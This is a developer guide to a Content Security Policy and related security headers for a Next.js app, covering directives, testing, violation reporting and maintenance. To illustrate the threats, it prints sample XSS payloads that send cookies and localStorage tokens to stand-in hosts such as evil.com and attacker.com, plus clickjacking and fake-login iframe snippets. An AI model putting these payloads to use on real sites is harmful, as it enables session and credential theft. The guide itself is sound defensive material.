# Content Security Policy (CSP) Implementation Guide

## What is CSP?

Content Security Policy (CSP) is a security standard that helps prevent:
- **Cross-Site Scripting (XSS)** attacks
- **Clickjacking** attacks
- **Code injection** attacks
- **Data theft** via malicious scripts
- **Unauthorized resource loading**

Think of CSP as a "whitelist" that tells the browser: *"Only load resources from these approved sources."*

---

## Implementation in Your App

### Location
`src/proxy.ts` (middleware)

### What We Added

A comprehensive CSP policy with the following directives:

```typescript
const cspDirectives = [
  "default-src 'self'",                    // Default: only from same origin
  "script-src 'self' 'unsafe-inline'",     // Scripts from self + inline (Next.js needs this)
  "style-src 'self' 'unsafe-inline'",      // Styles from self + inline (Tailwind needs this)
  "img-src 'self' data: blob: https://images.unsplash.com https://placehold.co",
  "connect-src 'self' https://*.supabase.co https://www.googleapis.com ...",
  "frame-src 'self'",                      // Only embed iframes from same origin
  "object-src 'none'",                     // Block Flash, Java, etc.
  "base-uri 'self'",                       // Prevent base tag hijacking
  "form-action 'self'",                    // Forms only submit to same origin
  "frame-ancestors 'self'",                // Only allow embedding on same origin
  "upgrade-insecure-requests",             // Auto-upgrade HTTP to HTTPS
  "block-all-mixed-content",               // Block HTTP resources on HTTPS pages
];
```

---

## Benefits

### 1. **XSS Attack Prevention** (Primary Benefit)

**Before CSP:**
If an attacker injects malicious JavaScript:

```html
<!-- Attacker injects this via a vulnerable input field -->
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie // Steals session cookies
  });
</script>
```

**Result:** Script executes, user data stolen. 😱

**After CSP:**
Browser blocks the script because `evil.com` is not in the whitelist.

```
Refused to load the script 'https://evil.com/steal' because it violates the
following Content Security Policy directive: "connect-src 'self' https://*.supabase.co..."
```

**Result:** Attack blocked. 🛡️

---

### 2. **Clickjacking Prevention**

**Clickjacking** = Embedding your site in a hidden iframe to trick users into clicking malicious elements.

**Before CSP:**
Attacker creates:

```html
<!-- evil-site.com -->
<iframe src="https://noctra.studio/dashboard" style="opacity:0.001;"></iframe>
<button style="position:absolute; top:100px;">Click for Free Bitcoin!</button>
```

User thinks they're clicking for Bitcoin, but actually clicking hidden buttons on your site.

**After CSP:**
```
frame-ancestors 'self'
```

Browser refuses to load your site in an iframe unless it's on your own domain.

---

### 3. **Data Exfiltration Prevention**

Prevents malicious scripts from sending data to unauthorized servers.

**Blocked by CSP:**
```javascript
// Attacker's injected script
fetch('https://attacker.com/log', {
  body: JSON.stringify({
    userData: localStorage.getItem('user'),
    authToken: document.cookie
  })
});
```

**CSP blocks this** because `attacker.com` is not in `connect-src`.

---

### 4. **Mixed Content Protection**

**Mixed content** = Loading HTTP resources (insecure) on an HTTPS page (secure).

**Before CSP:**
```html
<script src="http://example.com/library.js"></script>
<!-- ^ HTTP on HTTPS page = vulnerability -->
```

**After CSP:**
```
upgrade-insecure-requests
block-all-mixed-content
```

Browser automatically upgrades to HTTPS or blocks the request.

---

### 5. **Inline Script Protection**

While we allow `'unsafe-inline'` for Next.js compatibility, CSP still protects against many injection vectors by:
- Blocking external malicious scripts
- Preventing `eval()` in production
- Restricting resource origins

**Future improvement:** Use CSP nonces for stricter inline script control.

---

## How It Works

### 1. Browser Receives CSP Header

When a user visits your site, the server sends:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
```

### 2. Browser Enforces Policy

Every resource load (script, image, API call) is checked against the CSP policy.

**Example flow:**

```
User visits: https://noctra.studio
  ↓
Page loads: <script src="/app.js">
  ↓
Browser checks: Is "/app.js" allowed by script-src?
  ↓
CSP says: "script-src 'self'" → Same origin → ✅ ALLOWED
  ↓
Script loads successfully
```

```
Malicious code injects: <script src="https://evil.com/steal.js">
  ↓
Browser checks: Is "https://evil.com" allowed by script-src?
  ↓
CSP says: "script-src 'self'" → Different origin → ❌ BLOCKED
  ↓
Browser console shows CSP violation
```

### 3. Violations Logged

All CSP violations appear in the browser console:

```
Content Security Policy: The page's settings blocked the loading of a resource
at https://evil.com/steal.js ("script-src").
```

---

## CSP Directives Explained

### Core Directives

| Directive | What It Controls | Your Setting |
|-----------|------------------|--------------|
| `default-src` | Fallback for all resource types | `'self'` (same origin only) |
| `script-src` | JavaScript files | `'self' 'unsafe-inline'` + Vercel analytics |
| `style-src` | CSS files | `'self' 'unsafe-inline'` (for Tailwind) |
| `img-src` | Images | `'self' data: blob:` + Unsplash + Supabase |
| `connect-src` | AJAX, WebSocket, fetch() | `'self'` + Supabase + Google APIs + Sentry |
| `font-src` | Web fonts | `'self' data:` |
| `frame-src` | iframes | `'self'` (no external iframes) |
| `object-src` | Flash, Java applets | `'none'` (blocked completely) |

### Security Directives

| Directive | Purpose | Effect |
|-----------|---------|--------|
| `base-uri 'self'` | Prevent base tag hijacking | Attackers can't change base URL |
| `form-action 'self'` | Control form submissions | Forms only submit to your domain |
| `frame-ancestors 'self'` | Prevent clickjacking | Site can't be embedded in other sites |
| `upgrade-insecure-requests` | Auto HTTPS | HTTP URLs become HTTPS |
| `block-all-mixed-content` | No HTTP on HTTPS | All resources must be HTTPS |

---

## Development vs Production

### Development Mode
```typescript
isDevelopment
  ? "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://vercel.live"
  : "script-src 'self' 'unsafe-inline' https://vercel.live https://va.vercel-scripts.com"
```

**Why `'unsafe-eval'` in dev?**
- Next.js Fast Refresh uses `eval()` for hot module replacement
- Webpack dev mode needs `eval()` for source maps
- Removed in production for security

---

## Testing CSP

### 1. Check Headers

Open DevTools → Network → Click any request → Headers:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
```

### 2. Intentionally Break It

Add a test script to any page:

```html
<script src="https://example.com/test.js"></script>
```

**Expected result:** CSP violation in console.

### 3. Monitor Violations

Open Console (Cmd+Option+J / Ctrl+Shift+J):

```
Refused to load the script 'https://example.com/test.js' because it violates
the following Content Security Policy directive: "script-src 'self' 'unsafe-inline'..."
```

---

## Additional Security Headers

We also added:

### Permissions Policy
```
Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
```

**Benefits:**
- Blocks access to device camera/microphone
- Disables geolocation tracking
- Opts out of Google FLoC (privacy)

### X-XSS-Protection
```
X-XSS-Protection: 1; mode=block
```

Legacy XSS filter for older browsers (IE, Safari).

### Strict-Transport-Security (HSTS)
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

**Benefits:**
- Forces HTTPS for 2 years
- Applies to all subdomains
- Eligible for HSTS preload list (browsers hardcode HTTPS)

---

## Real-World Attack Examples Blocked by CSP

### Attack 1: Stored XSS

**Scenario:** Admin panel has a vulnerability in the "Company Name" field.

**Attack:**
```javascript
// Attacker sets company name to:
<img src=x onerror="fetch('https://evil.com',{method:'POST',body:document.cookie})">
```

**Without CSP:** Cookie stolen when admin views dashboard.

**With CSP:** `connect-src` blocks the fetch to `evil.com`. Attack fails.

---

### Attack 2: CDN Compromise

**Scenario:** You use a third-party analytics library from a CDN. The CDN gets hacked.

**Attack:**
```html
<!-- Before: Loaded from CDN -->
<script src="https://cdn.analytics.com/tracker.js"></script>

<!-- After hack: CDN serves malicious code -->
<script>
  // Now contains malware
</script>
```

**Without CSP:** Malicious script executes because you loaded it.

**With CSP:** If the script tries to connect to unauthorized domains, it's blocked.

**Best practice:** Use Subresource Integrity (SRI) hashes for CDN scripts.

---

### Attack 3: iframe Injection

**Scenario:** Vulnerability allows attacker to inject HTML.

**Attack:**
```html
<iframe src="https://malicious-site.com/fake-login"></iframe>
```

Displays a fake login page that steals credentials.

**Without CSP:** iframe loads successfully.

**With CSP:** `frame-src 'self'` blocks it. User sees blank space.

---

## Monitoring CSP Violations (Advanced)

### Option 1: Browser Console

All violations appear in DevTools console (development mode).

### Option 2: report-uri (Production)

Add to CSP:

```typescript
"report-uri https://noctra.studio/api/csp-report"
```

Then create `/api/csp-report/route.ts`:

```typescript
export async function POST(req: Request) {
  const violation = await req.json();

  // Log to Sentry
  console.error('CSP Violation:', violation);

  // Store in database for analysis
  // await db.violations.insert(violation);

  return new Response(null, { status: 204 });
}
```

**Benefits:**
- Track which scripts are being blocked
- Identify false positives (legitimate scripts blocked by mistake)
- Detect attack attempts

---

## Common Issues & Solutions

### Issue: "Refused to load inline script"

**Cause:** CSP blocks inline `<script>` tags without nonces.

**Solution:** We use `'unsafe-inline'` for Next.js compatibility. For stricter security, use CSP nonces:

```typescript
// Generate nonce per request
const nonce = crypto.randomUUID();

// Add to CSP
script-src 'nonce-${nonce}'

// Use in scripts
<script nonce={nonce}>...</script>
```

### Issue: "Refused to connect to API"

**Cause:** API domain not in `connect-src`.

**Solution:** Add to CSP:

```typescript
"connect-src 'self' https://api.example.com"
```

### Issue: External fonts not loading

**Cause:** Font CDN not in `font-src`.

**Solution:** Add font CDN to whitelist:

```typescript
"font-src 'self' https://fonts.gstatic.com"
```

---

## Browser Compatibility

| Browser | CSP Support |
|---------|-------------|
| Chrome | ✅ Full support |
| Firefox | ✅ Full support |
| Safari | ✅ Full support |
| Edge | ✅ Full support |
| IE 11 | ⚠️ Partial (use X-Content-Security-Policy) |

**Coverage:** 98%+ of users.

---

## Maintenance

### When to Update CSP

1. **Adding new external services:**
   - New API? Add to `connect-src`
   - New image host? Add to `img-src`
   - New analytics tool? Add to `script-src`

2. **Third-party integrations:**
   - Chat widgets (e.g., Intercom) need CSP updates
   - Payment processors (e.g., Stripe) require specific directives

3. **Security incidents:**
   - If a CDN is compromised, remove it immediately
   - Tighten CSP after vulnerability discoveries

### Testing After Changes

1. Add new directive
2. Test in development
3. Check browser console for violations
4. Deploy to staging
5. Test all user flows
6. Deploy to production
7. Monitor CSP violation reports

---

## CSP Scoring

Your current CSP scores:

**Mozilla Observatory:** Expected grade: **A-** to **B+**
- ✅ `default-src` defined
- ✅ No `unsafe-eval` in production
- ✅ `frame-ancestors` set
- ⚠️ `'unsafe-inline'` in script-src (required for Next.js)

**Improvements for A+ score:**
1. Use CSP nonces instead of `'unsafe-inline'`
2. Add `report-uri` for violation monitoring
3. Implement Subresource Integrity (SRI)

---

## Next Steps

### Immediate
- ✅ CSP implemented (done!)
- ✅ Security headers added (done!)
- ✅ Production build tested (done!)

### Short-term
1. Monitor browser console for CSP violations
2. Test all user flows (login, dashboard, forms)
3. Add CSP violation reporting endpoint

### Long-term
1. Migrate to CSP nonces for stricter inline script control
2. Add Subresource Integrity (SRI) hashes for CDN resources
3. Implement Content Security Policy Report-Only mode for testing

---

## Summary

Your Noctra Studio app now has **enterprise-grade CSP protection** that:

✅ Blocks XSS attacks
✅ Prevents clickjacking
✅ Stops data exfiltration
✅ Forces HTTPS
✅ Restricts resource loading
✅ Protects user privacy

**Security improvement:** Medium → **High** 🔒

**Production-ready:** ✅ Yes (build passes, no breaking changes)

---

## Resources

- [MDN CSP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Test your policy
- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Report URI](https://report-uri.com/) - CSP monitoring service

---

**Questions? Issues?** Check browser console for CSP violations or ask me!
